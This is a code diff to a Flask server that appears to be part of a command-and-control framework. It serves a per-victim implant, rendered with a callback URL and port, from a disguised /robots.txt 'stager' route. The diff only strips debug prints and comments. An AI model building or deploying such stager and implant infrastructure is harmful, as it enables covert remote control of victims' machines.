@@ -1,12 +1,13 @@
 from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, send_file, send_from_directory
 import base64
-#from Controller import OnlyOne
 from Implant.Implant import ImplantSingleton
 from Data.Database import Database
 Imp=ImplantSingleton.instance
 def ImplantManager(a):
     if "X-Implant" in a:
         print("Checked in implant is: ",a["X-Implant"])
+
+
 
 db=Database()
 hello_world = None
@@ -27,14 +28,11 @@ def add_header( r):
 @app.route("/robots.txt",methods=['GET'])
 def Stager():
     # This needs to return the implant!
-    print("@@",request.values['user'])
-    # -- THIS MAY NOT BE NEEDED OR HAVE BEEN REBUILD
-    # a=db.Get_ImplantFromStagerKey(request.values['user'])
+
 
     # -- TODO:
     # -- Build checking before triggering this!
     b = db.Register_NewImplantFromStagerKey(request.values['user'])
-    print(b)
     if b:
         from jinja2 import Environment, FileSystemLoader
         env = Environment(loader=FileSystemLoader('implant_core'))
@@ -44,9 +42,6 @@ def Stager():
         output_from_parsed_template = template.render(url=b[0]['callback_url'], port=b[0]['port'], uii=b[0]['unique_implant_id'])
     else:
         return "404", 404
-    #print(output_from_parsed_template)
-
-
 
     return output_from_parsed_template
 
